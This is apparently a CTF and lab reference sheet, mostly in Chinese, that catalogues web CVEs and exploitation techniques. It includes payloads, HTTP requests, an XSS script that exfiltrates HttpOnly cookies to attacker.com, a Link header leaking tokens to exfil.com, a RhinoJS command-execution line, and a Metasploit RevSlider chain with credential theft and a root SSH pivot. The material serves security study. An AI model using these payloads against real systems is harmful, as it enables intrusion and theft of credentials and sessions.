# CTF Web - CVEs & Browser Vulnerabilities

聚焦特定 CVE 与漏洞模式。Node.js 相关 CVE（flatnest、Happy-DOM）见 [node-and-prototype.md](node-and-prototype.md)。JWT 算法混淆见 [auth-and-access.md](auth-and-access.md)。

## Table of Contents
- [CVE-2025-29927：Next.js 中间件绕过](#cve-2025-29927-nextjs-middleware-bypass)
- [CVE-2025-0167：Curl `.netrc` 凭据泄露](#cve-2025-0167-curl-netrc-credential-leakage)
- [Uvicorn CRLF 注入（未修复 N-Day）](#uvicorn-crlf-injection-unpatched-n-day)
- [Python urllib Scheme 校验绕过（0-Day）](#python-urllib-scheme-validation-bypass-0-day)
- [通过 Link 头的 Chrome Referrer 泄露（2025）](#chrome-referrer-leak-via-link-header-2025)
- [TCP 分包（防火墙绕过）](#tcp-packet-splitting-firewall-bypass)
- [Puppeteer/Chrome JavaScript 绕过](#puppeteerchrome-javascript-bypass)
- [Python python-dotenv 注入](#python-python-dotenv-injection)
- [经 RFC 2047 的 HTTP 请求拆分](#http-request-splitting-via-rfc-2047)
- [Waitress WSGI Cookie 外带](#waitress-wsgi-cookie-exfiltration)
- [Deno Import Map 劫持](#deno-import-map-hijacking)
- [CVE-2025-8110：Gogs Symlink RCE](#cve-2025-8110-gogs-symlink-rce)
- [CVE-2021-22204：ExifTool DjVu Perl 注入](#cve-2021-22204-exiftool-djvu-perl-injection)
- [真值哈希检查导致认证失效（0xFun 2026）](#broken-auth-via-truthy-hash-check-0xfun-2026)
- [AAEncode/JJEncode JS 反混淆（0xFun 2026）](#aaencodejjencode-js-deobfuscation-0xfun-2026)
- [协议复用：同端口同时跑 SSH+HTTP（0xFun 2026）](#protocol-multiplexing--sshhttp-on-same-port-0xfun-2026)
- [CVE-2024-28184：WeasyPrint 附件 SSRF / 文件读取](#cve-2024-28184-weasyprint-attachment-ssrf--file-read)
- [CVE-2025-55182 / CVE-2025-66478：React Server Components Flight 协议 RCE](#cve-2025-55182--cve-2025-66478-react-server-components-flight-protocol-rce)
- [CVE-2024-45409：Ruby-SAML XPath Digest Smuggling（Barrier HTB）](#cve-2024-45409-ruby-saml-xpath-digest-smuggling-barrier-htb)
- [CVE-2023-27350：PaperCut NG 认证绕过 + RCE（Bamboo HTB）](#cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb)
- [CVE-2024-22120：Zabbix 时间盲 SQLi（Watcher HTB）](#cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb)
- [CVE-2012-0053：通过 400 Bad Request 泄露 Apache HttpOnly Cookie（RC3 CTF 2016）](#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)
- [CVE-2014-9734：WordPress RevSlider 上传 + MySQL `load_file()` SSH Pivot（TAMUctf 2019）](#cve-2014-9734-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019)
- [检测清单](#detection-checklist)

---

## CVE-2025-29927: Next.js Middleware Bypass

**受影响版本：** Next.js < 14.2.25，以及 15.x < 15.2.3

```http
GET /protected/endpoint HTTP/1.1
Host: target
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

可绕过认证中间件，直接访问受保护端点和仅管理员可访问路由。

**与 SSRF 串联（Note Keeper, Pragyan 2026）：** 绕过中间件后，再注入 `Location` 头，诱导 Next.js 内部 fetch 任意 URL：
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     -H "Location: http://backend:4000/flag" \
     https://target/api/login
```
Next.js 会处理 `Location` 头并在内部抓取指定 URL，从而对内网服务形成 SSRF。

---

## CVE-2025-0167: Curl .netrc Credential Leakage

服务器 A（存在于 `.netrc` 中）重定向到服务器 B 时，如果 B 返回 `401 + WWW-Authenticate: Basic`，curl 会把凭据发给 B。

```python
@app.route('/<path:path>')
def leak(path):
    return '', 401, {'WWW-Authenticate': 'Basic realm="leak"'}
```

---

## Uvicorn CRLF Injection (Unpatched N-Day)

**受影响：** Uvicorn（FastAPI 默认 ASGI 服务器），该问题已报告但未被修复。

Uvicorn 不会清洗响应头中的 CRLF，可导致：
1. **CSP 绕过**：注入破坏 Content-Security-Policy 的头
2. **缓存投毒**：打断头/体边界，让 Nginx 缓存攻击者内容
3. **XSS**：用 `\r\n\r\n` 结束头部，后续内容变成响应体

```python
payload = {"headers": {"lol\r\n\r\n<script>evil()</script>": "x"}}
requests.get(f'{HOST}/api/health', params={"test": json.dumps(payload)})
```

**检测：** FastAPI/Uvicorn 后端，且存在把用户输入反射到响应头的端点。

---

## Python urllib Scheme Validation Bypass (0-Day)

**受影响：** Python `urllib`，问题在于 `urlsplit` 与 `urlretrieve` 的解析不一致。

`urlsplit("<URL:http://attacker.com/evil>").scheme` 会返回空字符串 `""`，但 `urlretrieve` 仍会把它当作 HTTP 抓取。

```python
# App blocks http/https via urlsplit:
parsed = urlsplit(user_url)
if parsed.scheme in ['http', 'https']: raise Exception("Blocked")
# Bypass: <URL:http://attacker.com/malicious.so>
# Also: %0ahttp://attacker.com/malicious.so (newline prefix)
```

这里利用的是 RFC 1738 的遗留 `<URL:...>` 格式。

---

## Chrome Referrer Leak via Link Header (2025)

```http
HTTP/1.1 200 OK
Link: <https://exfil.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

Chrome 会在抓取链接资源时附带完整 referrer URL，因此可泄露 `/auth/callback?token=secret` 这类地址中的 token。

---

## TCP Packet Splitting (Firewall Bypass)

把被拦截的关键字拆到不同 TCP 包边界上：
```python
s = socket.socket(); s.connect((host, port))
s.send(b"GET /fla")
s.send(b"g.html HTTP/1.1\r\nHost: 127.0.0.1\r\nRange: bytes=135-\r\n\r\n")
```

---

## Puppeteer/Chrome JavaScript Bypass

`page.setJavaScriptEnabled(false)` 只作用于当前上下文。若在 iframe 中调用 `window.open()` 打开新窗口，新窗口里 JS 仍然是启用的。

---

## Python python-dotenv Injection

可在值中注入转义序列与换行：
```text
backup_server=x\'\nEVIL_VAR=malicious_value\n\'
```
再配合 `PYTHONWARNINGS=ignore::antigravity.Foo::0` 与 `BROWSER=/bin/sh -c "cat /flag" %s` 可打到 RCE。`PYTHONWARNINGS` 技巧细节见 `ctf-misc/pyjails.md`。

---

## HTTP Request Splitting via RFC 2047

CherryPy 会解码 RFC 2047 头，从而出现 CRLF 注入：
```python
payload = b"value\r\n\r\nGET /second HTTP/1.1\r\nHost: backend\r\n"
encoded = f"=?ISO-8859-1?B?{base64.b64encode(payload).decode()}?="
```

---

## Waitress WSGI Cookie Exfiltration

非法 HTTP 方法会被回显到错误响应中。利用 CRLF 分裂请求后，可把 cookie 值放到方法位置，让错误页回显它。

---

## Deno Import Map Hijacking

Deno v1.18+ 会自动发现 `deno.json`。配合原型污染可写入：
```javascript
({}).__proto__["deno.json"] = '{"importMap": "https://evil.com/map.json"}'
```

---

## CVE-2025-8110: Gogs Symlink RCE

完整细节见 [server-side.md](server-side.md)。

---

## CVE-2021-22204: ExifTool DjVu Perl Injection

**受影响版本：** ExifTool ≤ 12.23。DjVu 的 ANTa annotation chunk 会被 Perl `eval` 解析。构造最小化 DjVu 并注入恶意元数据后，凡是使用 ExifTool 处理图片的端点都可能被打到 RCE。

完整利用代码见 [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)。

---

## Broken Auth via Truthy Hash Check (0xFun 2026)

**模式：** `sha256().hexdigest()` 会返回非空字符串，在 Python 中恒为 truthy。若认证函数只检查 `if sha256(...)`，则始终为真，真正的哈希比较根本没有发生。

**检测：** 搜索 `if hash_function(...)` 这类写法，而不是 `if hash_function(...) == expected`。

---

## AAEncode/JJEncode JS Deobfuscation (0xFun 2026)

这类 JS 混淆最终都会落到 `Function(...)()`。可覆盖 `Function.prototype.constructor` 来拦截还原后的代码：
```javascript
Function.prototype.constructor = function(code) {
    console.log("Decoded:", code);
    return function() {};
};
```

**AAEncode：** 使用日文 Unicode 字符。**JJEncode：** 常见形态是 `$=~[]`。两者最终都会还原为 `Function(decoded_string)()`。

---

## Protocol Multiplexing — SSH+HTTP on Same Port (0xFun 2026)

服务端会根据首字节区分 SSH 与 HTTP。若题目提示“更少的端口”，可直接尝试 `ssh -p <http_port> user@host`。凭据有时藏在 HTML 注释里。

---

## CVE-2024-28184: WeasyPrint Attachment SSRF / File Read

**受影响：** WeasyPrint（多个版本）

**漏洞：** WeasyPrint 会处理 `<a rel="attachment">` 与 `<link rel="attachment">` 标签，抓取其中引用的 URL，并把结果嵌成 PDF 附件。内部头部校验（例如 `X-Fetcher`）不会应用到附件抓取流程。

**攻击向量：**
1. **SSRF：** `<a rel="attachment" href="http://127.0.0.1/admin/flag">`，从 localhost 抓取，绕过 IP 限制
2. **本地文件读取：** `<link rel="attachment" href="file:///flag.txt">`，把本地文件嵌入 PDF
3. **盲预言机：** 只有当目标返回 200 时，附件才会出现在 PDF 里，可通过 `/Type /EmbeddedFile` 是否存在构造布尔预言机

**提取：**
```bash
pdfdetach -list output.pdf        # List embedded files
pdfdetach -save 1 -o flag.txt output.pdf  # Extract
```

**检测：** 存在 URL 转 PDF 功能，且 `requirements.txt` 或 `Pipfile` 中使用 WeasyPrint。

---

## CVE-2025-55182 / CVE-2025-66478: React Server Components Flight Protocol RCE

**受影响：** React Server Components / Next.js（Flight 协议反序列化）。通过伪造 Flight chunk，可利用构造器链（`constructor → constructor → Function`）执行任意服务端 JavaScript。可用 `Next-Action` 与 `Accept: text/x-component` 头识别。另有报告编号 CVE-2025-66478，对应另一条原型链变体（`__proto__:then` 替代 `constructor:constructor`）。

完整利用链见 [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-protocol-rce-ehax-2026)。

---

## CVE-2024-45409: Ruby-SAML XPath Digest Smuggling (Barrier HTB)

**受影响：** GitLab 17.3.2（`ruby-saml` 库）

该漏洞利用了 `ruby-saml` 签名验证中的 XPath 歧义，可伪造宣称任意用户身份的 SAML（Security Assertion Markup Language）断言。

**攻击链：**
1. 从合法 SAML 响应中提取 IdP（Identity Provider）元数据签名
2. 构造声称目标用户身份（如 `akadmin`）的断言
3. 把断言 ID 设成与元数据引用 URI 一致
4. 计算正确的 digest，并放入 `StatusDetail` 元素中，让 XPath 命中这个被走私的 digest 而非原值
5. 向 `/users/auth/saml/callback` 提交伪造响应

**检测：** GitLab < 17.3.3 且启用了 SAML SSO。

---

## CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)

**受影响：** PaperCut NG < 22.0.9（CVSS 9.8）

**攻击链：**
1. 访问 `/app?service=page/SetupCompleted`，拿到未认证管理员会话
2. 在 Config Editor 中启用 `print-and-device.script.enabled`，并关闭 `print.script.sandboxed`
3. 在打印机配置中注入 RhinoJS 脚本实现 RCE：
```javascript
java.lang.Runtime.getRuntime().exec(["/bin/bash", "-c", "CMD"])
```
4. 通过 HTTP 回调并结合 base64 编码外带输出
5. 借 Squid 代理访问内网服务：
```bash
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
```

**关键点：** `SetupCompleted` 端点无需凭据即可授予完整管理员权限。再结合 Squid 代理即可继续打内网服务。

---

## CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)

**受影响：** Zabbix（通过 trapper 10051 端口写审计日志的功能）

该漏洞利用 Zabbix trapper 协议中未清洗的 `clientip` 字段，做时间型盲 SQL 注入，之后再经 Zabbix API 升级到 RCE。

**攻击链：**
1. 以 guest 身份登录 Zabbix 前端，解 base64 Cookie 取出 `sessionid`
2. 通过 trapper 10051 端口发送恶意 `clientip` 字段，构造时间型盲注
3. 通过 sleep 时间逐字符提取管理员 session ID
4. 用窃取到的管理员 session 调用 Zabbix API
5. 通过 `script.create` + `script.execute` API 实现 RCE

**关键点：** 利用脚本输出中的 `\r`（carriage return）可能导致终端显示残留。使用前应确认提取出的 session ID 恰好是 32 位十六进制。

**检测：** Zabbix 暴露 trapper 10051 端口，且启用了 audit log。

---

## CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)

Apache 2.2.x（2.2.22 之前）会在 400 Bad Request 错误页中反射 Cookie，导致 HttpOnly 保护失效。与 XSS 组合后即可外带会话 Cookie。

```javascript
// XSS payload to trigger Apache 400 error and leak HttpOnly cookies
// Works on Apache 2.2.0 - 2.2.21

// Step 1: Inflate cookie header to exceed Apache's limit (triggers 400)
var xhr = new XMLHttpRequest();
document.cookie = "padding=" + "A".repeat(4000);

// Step 2: Request to the vulnerable Apache server
xhr.open("GET", "http://target:8080/", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // 400 response body contains ALL cookies including HttpOnly ones
        var cookies = xhr.responseText.match(/Cookie:.*$/m);
        // Exfiltrate to attacker
        new Image().src = "http://attacker.com/steal?c=" + encodeURIComponent(cookies);
    }
};
xhr.send();
```

**关键点：** Apache 2.2.x 在 2.2.22 之前会把完整 Cookie 头写进 400 Bad Request HTML 响应，包括 HttpOnly Cookie。若同源存在 XSS，则可彻底击穿 HttpOnly。检查服务端版本头是否落在受影响区间。

---

## CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)

**受影响：** WordPress Slider Revolution（RevSlider）插件 `<= 3.0.95`，通过 `update_plugin` admin-ajax action 可未认证任意文件上传。

**版本指纹：** 访问 `/wp-content/plugins/revslider/release_log.txt`，即使后台 UI 被锁，插件仍会在那里暴露版本。

```bash
# 1. RCE via RevSlider upload (Metasploit module)
msfconsole -q -x "use exploit/unix/webapp/wp_revslider_upload_execute; \
  set RHOSTS 172.30.0.3; set LHOST tun0; exploit"

# 2. From the meterpreter shell, steal DB creds from wp-config.php
cat /var/www/wp-config.php | grep -E "DB_(NAME|USER|PASSWORD|HOST)"
# -> DB_USER='wordpress', DB_PASSWORD='0NYa6PBH52y86C', DB_HOST='172.30.0.2'

# 3. Pivot: connect as the DB user and read any world-readable file with load_file()
mysql -h 172.30.0.2 -u wordpress --password='0NYa6PBH52y86C' \
      -e "SELECT load_file('/backup/id_rsa')"
#   (requires FILE privilege, granted to the WP user on older default stacks)

# 4. Use the exfiltrated key to SSH into the target as root
chmod 400 rsa.key
ssh -i rsa.key root@172.30.0.3
```

**关键点：** 插件上传拿到 RCE 往往只是开始。应立刻从 `wp-config.php` 抽取数据库凭据，连接 DB 后用 `load_file()` 读取任意世界可读文件（如 `/backup/`、`/root/.ssh/`、`/home/*/.ssh/`、CI secrets 等），再 SSH pivot 到真正目标机。在 CTF 环境里，WP 用户几乎总带 `FILE` 权限。常见可与单次文件上传串联的模块包括：`wp_revslider_upload_execute`、`wp_admin_shell_upload`、`wp_asset_manager_upload_exec`、`wp_symposium_shell_upload`。

**参考：** TAMUctf 2019 — Wordpress, writeup 13593。Rapid7 模块 `exploit/unix/webapp/wp_revslider_upload_execute`。

---

## Detection Checklist

1. `package.json`、`requirements.txt`、`Dockerfile` 中的**框架版本**
2. **ASGI/WSGI 服务器**（Uvicorn、Waitress），重点看 CRLF/头处理问题
3. **curl 的使用方式**，尤其是 `.netrc` 与重定向处理
4. **防火墙/WAF** 检查模式，是否可被 TCP 分包绕过
5. **dotenv** 或环境变量处理逻辑
6. **urllib** 的 scheme 校验，检查 `<URL:...>` 绕过
7. **Node.js 依赖库**，完整列表见 [node-and-prototype.md](node-and-prototype.md)
8. **启用 SAML SSO 的 GitLab**，核对是否受 ruby-saml CVE-2024-45409 影响
9. **PaperCut NG**，检查 `/app?service=page/SetupCompleted` 是否可未认证访问
10. **Zabbix trapper 端口**（10051），审计日志中的 `clientip` SQLi
